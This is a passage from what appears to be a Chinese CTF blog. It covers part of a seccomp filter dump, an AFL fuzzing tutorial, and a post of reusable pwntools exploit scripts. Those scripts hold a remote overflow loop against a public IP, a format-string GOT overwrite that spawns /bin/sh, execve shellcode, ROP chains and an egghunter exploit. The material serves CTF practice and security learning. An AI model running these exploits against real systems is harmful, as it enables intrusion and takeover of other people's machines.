0x01 0x00000038  if (A != clone) goto 0009</span><br><span class="line">#  0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line">#  0009: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0011</span><br><span class="line">#  0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line">#  0011: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0013</span><br><span class="line">#  0012: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line">#  0013: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0015</span><br><span class="line">#  0014: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line">#  0015: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0017</span><br><span class="line">#  0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line">#  0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">code为操作码，JT是成功跳转的相对函数，JF是失败相对跳转，k是内存内容。</span><br><span class="line">arch为架构，sys_number是调用号，args[1]是参数</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A != open ? ok : next</span><br><span class="line">A = args[0]</span><br><span class="line">A &amp;= 0xff</span><br><span class="line">A == 0x64 ? ok : next</span><br><span class="line">return ERRNO</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/afl/">afl</a></h1>
  

    </header>
    <div class="entry">
      
        <p>afl-fuzz技术初探<br>目录</p>
<p>安装lzma-sdk<br>安装ucl<br>安装zlib<br>编译upx</p>
<p>afl-fuzz技术初探<br>转载请注明出处:<a href="http://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">http://www.cnblogs.com/WangAoBo/p/8280352.html</a></p>
<p>参考了:</p>
<p><a href="http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/</a></p>
<p><a href="http://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">http://blog.csdn.net/youkawa/article/details/45696317</a></p>
<p><a href="https://stfpeak.github.io/2017/06/12/AFL-Cautions/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/06/12/AFL-Cautions/</a></p>
<p><a href="http://blog.csdn.net/abcdyzhang/article/details/53487683" target="_blank" rel="noopener">http://blog.csdn.net/abcdyzhang/article/details/53487683</a></p>
<h1 id="安装afl"><a href="#安装afl" class="headerlink" title="安装afl"></a>安装afl</h1><pre><code>下载最新源码
解压并安装:
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash $make $sudo make all</span><br></pre></td></tr></table></figure>
<p>​    </p>
<h2 id="有源码的afl-fuzz"><a href="#有源码的afl-fuzz" class="headerlink" title="有源码的afl-fuzz"></a>有源码的afl-fuzz</h2><pre><code>这里以fuzz upx为例进行测试

编译upx
upx项目地址([*https://github.com/upx/upx*)
因为afl会对有源码的程序进行重新编译,因此需要修改upx的Makefile
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$git clone https://github.com/upx/upx.git</span><br><span class="line">$cd upx</span><br><span class="line">$vim Makefile</span><br><span class="line">CC = /usr/local/bin/afl-gcc #添加此句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd src</span><br><span class="line">$vim Makefile</span><br><span class="line">CXX    ?= /usr/local/bin/afl-g++ #将CXX改成afl-g++</span><br></pre></td></tr></table></figure>
<h3 id="安装lzma-sdk"><a href="#安装lzma-sdk" class="headerlink" title="安装lzma-sdk"></a>安装lzma-sdk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$git submodule update --init --recursive</span><br></pre></td></tr></table></figure>
<h3 id="安装ucl"><a href="#安装ucl" class="headerlink" title="安装ucl"></a>安装ucl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash $cd ucl-1.03 $./configure $make $sudo make install</span><br><span class="line">bash $export UPX_UCCLDIR=&quot;~/ucl-1.03&quot;</span><br></pre></td></tr></table></figure>
<h3 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$wget http://pkgs.fedoraproject.org/repo/pkgs/zlib/zlib-1.2.11.tar.xz/sha512/b7f50ada138c7f93eb7eb1631efccd1d9f03a5e77b6c13c8b757017b2d462e19d2d3e01c50fad60a4ae1bc86d431f6f94c72c11ff410c25121e571953017cb67/zlib-1.2.11.tar.xz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd zlib-1.2.11/</span><br><span class="line">$./configure</span><br><span class="line">$sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="编译upx"><a href="#编译upx" class="headerlink" title="编译upx"></a>编译upx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~/upx</span><br><span class="line">$make all</span><br></pre></td></tr></table></figure>
<p>此时可在/src目录下找到upx.out文件<br>对upx进行fuzz测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~</span><br><span class="line">$mkdir afl_in afl_out</span><br></pre></td></tr></table></figure>
<p>afl_in存放测试用例,afl_out存放fuzz结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cp /usr/bin/file afl_in</span><br><span class="line">$afl-fuzz -i afl_in -o afl_out ~/upx/src/upx.out @@</span><br></pre></td></tr></table></figure></p>
<p>@@会代替测试样本,即相当于执行了upx.out file</p>
<p>对于从stdin获取输入的程序,可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># afl-fuzz -i afl_in -o afl_out ./file</span><br></pre></td></tr></table></figure></p>
<h2 id="无源码的afl-fuzz"><a href="#无源码的afl-fuzz" class="headerlink" title="无源码的afl-fuzz"></a>无源码的afl-fuzz</h2><pre><code>对无源码的程序进行fuzz一般有两种方法:
对二进制文件进行插桩
使用-n选项进行传统的fuzz测试
这里主要介绍第一种,该方法是通过afl-qemu实现的.
</code></pre><p>编译afl版的qemu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd qemu_mode </span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure></p>
<p>另外需要把afl加入环境变量<br>例如：编辑/etc/profile文件，添加CLASSPATH变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/profile </span><br><span class="line">export CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib</span><br></pre></td></tr></table></figure></p>
<h3 id="对readelf进行fuzz"><a href="#对readelf进行fuzz" class="headerlink" title="对readelf进行fuzz"></a>对readelf进行fuzz</h3><p>以readelf为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$mkdir afl_in afl_out</span><br><span class="line">$cp test afl_in</span><br><span class="line">test为自己准备的测试elf</span><br><span class="line">$sudo cp /usr/bin/readelf .</span><br><span class="line">$afl_fuzz -i afl_in -o afl_out -Q readelf -a @@</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/07/07/各种脚本/">各种脚本（比赛时候懒得现写）</a></h1>
  

    </header>
    <div class="entry">
      
        <p>gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</p>
<h1 id="远程挂起"><a href="#远程挂起" class="headerlink" title="远程挂起"></a>远程挂起</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line"> printhex(a)</span><br><span class="line"></span><br><span class="line"> p=remote(<span class="string">"35.205.206.137"</span>,<span class="number">1996</span>)</span><br><span class="line"></span><br><span class="line"> s=<span class="string">"\x90"</span>*<span class="number">900</span></span><br><span class="line"></span><br><span class="line"> s+=<span class="string">"bbbbbbbb"</span></span><br><span class="line"></span><br><span class="line"> s+=p64(a)</span><br><span class="line"></span><br><span class="line"> p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure>
<h1 id="远程泄露"><a href="#远程泄露" class="headerlink" title="远程泄露"></a>远程泄露</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> p.recvall()</span><br><span class="line"></span><br><span class="line"> a=a+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">length=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x8048000</span></span><br><span class="line"></span><br><span class="line">file=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr&lt;<span class="number">0x804b000</span>:</span><br><span class="line"></span><br><span class="line">       payload=<span class="string">"%13%s|||"</span>+p32(addr)</span><br><span class="line"></span><br><span class="line">       p.sendline(payload)</span><br><span class="line"></span><br><span class="line">       data=p.recvuntil(<span class="string">"|||"</span>).split(<span class="string">"|||"</span>)[<span class="number">0</span>].split(<span class="string">"hello"</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">      data+=<span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line">       length=len(data)</span><br><span class="line"></span><br><span class="line">       file+=data</span><br><span class="line"></span><br><span class="line">      addr=addr+length</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> open(<span class="string">"aaa"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">       f.write(file)</span><br></pre></td></tr></table></figure>
<h1 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h1><p>1。如果程序无法一次完成可以更改一个got表回到程序开始</p>
<p>2。尽可能用hhn可以减小输出次数，不然接收会有问题</p>
<p>3。字符串偏移如果不好算可以输出a来对齐</p>
<p>4.格式化漏洞x64中还要加上5个寄存器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">exit_got=<span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#0804866b</span></span><br><span class="line">print_got=<span class="number">0x0804a014</span></span><br><span class="line">z1=<span class="number">0x0804</span></span><br><span class="line">z1-=<span class="number">8</span></span><br><span class="line">z2=<span class="number">0x866d</span></span><br><span class="line">z2-=<span class="number">0x0804</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">p=process(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Welcome~\n'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;0&#125;d%32$hhn%&#123;1&#125;d%33$hhn%&#123;2&#125;d%34$hhn%&#123;3&#125;d%35$hhn'</span>.format((<span class="number">0x6E</span>)%<span class="number">0x100</span>,(<span class="number">0x186</span><span class="number">-0x6e</span>)%<span class="number">0x100</span>,(<span class="number">0x104</span><span class="number">-0x86</span>)%<span class="number">0x100</span>,(<span class="number">0x108</span><span class="number">-0x4</span>));</span><br><span class="line">payload = payload + <span class="string">'a'</span>* (<span class="number">100</span>-len(payload)) + p32(exit_got) + p32(exit_got + <span class="number">1</span>) + p32(exit_got + <span class="number">2</span>) + p32(exit_got + <span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">payload=p32(print_got)+<span class="string">"%7$s"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"%x"</span>%(printf_addr)</span><br><span class="line">system_addr=printf_addr-libc.symbols[<span class="string">'printf'</span>]+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">syslow1 = system_addr%<span class="number">0x100</span></span><br><span class="line">syslow2 = (system_addr/<span class="number">0x100</span>)%<span class="number">0x100</span></span><br><span class="line">syslow3 = (system_addr/<span class="number">0x10000</span>)%<span class="number">0x100</span></span><br><span class="line">syslow4 = (system_addr/<span class="number">0x1000000</span>)%<span class="number">0x100</span></span><br><span class="line">payload = <span class="string">'%&#123;0&#125;d%32$hhn%&#123;1&#125;d%33$hhn%&#123;2&#125;d%34$hhn%&#123;3&#125;d%35$hhn'</span>.format(syslow1,(<span class="number">0x100</span>+syslow2-syslow1)%<span class="number">0x100</span>,(<span class="number">0x100</span>+syslow3-syslow2)%<span class="number">0x100</span>,(<span class="number">0x100</span>+syslow4-syslow3)%<span class="number">0x100</span>);</span><br><span class="line">payload = payload + <span class="string">'a'</span> * (<span class="number">100</span>-len(payload)) + p32(print_got) + p32(print_got + <span class="number">1</span>) + p32(print_got + <span class="number">2</span>) + p32(print_got + <span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="gdb调试脚本"><a href="#gdb调试脚本" class="headerlink" title="gdb调试脚本"></a>gdb调试脚本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p,&quot;&quot;&quot;</span><br><span class="line">b *0x0000000000400C04  </span><br><span class="line">set $i=1</span><br><span class="line">commands</span><br><span class="line">if ($i==0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x /600xg *0x6020a0</span><br><span class="line">p main_arena</span><br><span class="line">p system</span><br><span class="line">end</span><br><span class="line">set $i=$i-1</span><br><span class="line">if ($i==0)</span><br><span class="line">continue</span><br><span class="line">end </span><br><span class="line">end</span><br><span class="line">continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io, &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    #b *0x400EC0 流程断点</span><br><span class="line">    watch *(long*)0x601DC0 + *(long*)0x601DC8 + *(long*)0x601DD0 + *(long*)0x601DD8 访问断点 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    set $fhd=0x0</span><br><span class="line">    define dump_list 自定义逻辑</span><br><span class="line">      set $hd=$arg0</span><br><span class="line">      x/2xg $hd</span><br><span class="line">      set $_node = *(long*)$hd</span><br><span class="line">      #p/x $_node</span><br><span class="line">      while ($_node &amp;&amp; $_node!=$hd)</span><br><span class="line">        x/4xg $_node</span><br><span class="line">        set $_node = *(long*)($_node+0x10)</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    commands 断点后执行</span><br><span class="line">      x/5i $rip</span><br><span class="line">      x/10xg 0x601DC0</span><br><span class="line">      set $item=0x601DC0</span><br><span class="line">      set $addr=0</span><br><span class="line">      </span><br><span class="line">      while ($item &lt; 0x601DF0)</span><br><span class="line">        if ($addr==0 || (*(long*)$item&gt;0 &amp;&amp; *(long*)$item&lt;$addr))</span><br><span class="line">          set $addr=*(long*)$item       </span><br><span class="line">        end</span><br><span class="line">        set $item=$item+8</span><br><span class="line">      end</span><br><span class="line">      if ($addr &gt; 0)</span><br><span class="line">        x/120xg ($addr -0x10)</span><br><span class="line">      end </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      set $item=0x601DC0</span><br><span class="line">      while ($item &lt; 0x601DF0 &amp;&amp; $fhd==0)</span><br><span class="line">        if (*(long*)$item &gt; 0)</span><br><span class="line">          if (*((long*)(*(long*)$item)) &gt; 0x7f0000000000)</span><br><span class="line">             set $fhd=(*((long*)(*(long*)$item)))</span><br><span class="line">          end         </span><br><span class="line">        end</span><br><span class="line">        set $item=$item+8</span><br><span class="line">      end </span><br><span class="line">      if $fhd&gt;0 </span><br><span class="line">        dump_list $fhd</span><br><span class="line">      end</span><br><span class="line">      continue</span><br><span class="line">    end</span><br><span class="line">    continue</span><br><span class="line">  &apos;&apos;&apos;)</span><br></pre></td></tr></table></figure>
<h1 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> *shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"</span></span><br><span class="line">		  <span class="string">"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"Length: %d\n"</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">(*(<span class="keyword">void</span>(*)()) shellcode)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="两种rop-and-egghunter"><a href="#两种rop-and-egghunter" class="headerlink" title="两种rop and egghunter"></a>两种rop and egghunter</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span> * <span class="number">24</span> + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(evil_addr)</span><br><span class="line"></span><br><span class="line"> payload = <span class="string">"http://%\0A"</span> + <span class="string">'A'</span>*(<span class="number">156</span><span class="number">-8</span>) + system_addr + <span class="string">'AAAA'</span>+ binsh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt + <span class="string">'A'</span>*<span class="number">4</span> + puts_got</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">24</span> + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh_libc = list(libc.search(<span class="string">'/bin/sh\x00'</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#init</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">'./egg'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">2334</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(pidof(<span class="string">'egg'</span>)[<span class="number">-1</span>],open(<span class="string">'zp'</span>))</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\x90\x50\x90\x50'</span>+<span class="string">"\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90"</span></span><br><span class="line">jmp_esp = <span class="number">0x0804885f</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Your party seat is'</span>)</span><br><span class="line">chunk_addr = int(io.recvuntil(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'chunk_addr = '</span>+ hex(chunk_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'trick?'</span>)</span><br><span class="line">io.sendline(<span class="string">'treat'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'located in '</span>)</span><br><span class="line">stack_addr = int(io.recvuntil(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_addr = '</span>+ hex(stack_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'your name?'</span>)</span><br><span class="line">egg_hunter = <span class="string">"\xb8"</span> + p32(chunk_addr) + <span class="string">"\xbb\x8f\x50\x90\x50\x43\x40\x39\x18\x75\xfb\xff\xe0\x01"</span></span><br><span class="line">payload = egg_hunter + <span class="string">'A'</span>*(<span class="number">20</span>-len(egg_hunter)) + p32(stack_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'sweets here.'</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="shellcode链"><a href="#shellcode链" class="headerlink" title="shellcode链"></a>shellcode链</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0:   50                      push   eax</span><br><span class="line">  1:   59                      pop    ecx</span><br><span class="line">  2:   53                      push   ebx</span><br><span class="line">  3:   58                      pop    eax</span><br><span class="line">  4:   48                      dec    eax</span><br><span class="line">  5:   75 39                   jne    0x40</span><br><span class="line">  7:   30 41 20                xor    BYTE PTR [ecx+0x20],al</span><br><span class="line">  a:   30 41 63                xor    BYTE PTR [ecx+0x63],al</span><br><span class="line">  d:   75 38                   jne    0x47</span><br><span class="line">  f:   34 33                   xor    al,0x33</span><br><span class="line"> 11:   30 41 64                xor    BYTE PTR [ecx+0x64],al</span><br><span class="line"> 14:   75 39                   jne    0x4f</span><br><span class="line"> 16:   6a 4d                   push   0x4d</span><br><span class="line"> 18:   58                      pop    eax</span><br><span class="line"> 19:   30 41 30                xor    BYTE PTR [ecx+0x30],al</span><br><span class="line"> 1c:   75 38                   jne    0x56</span><br><span class="line"> 1e:   6a 4d                   push   0x4d</span><br><span class="line"> 20:   58                      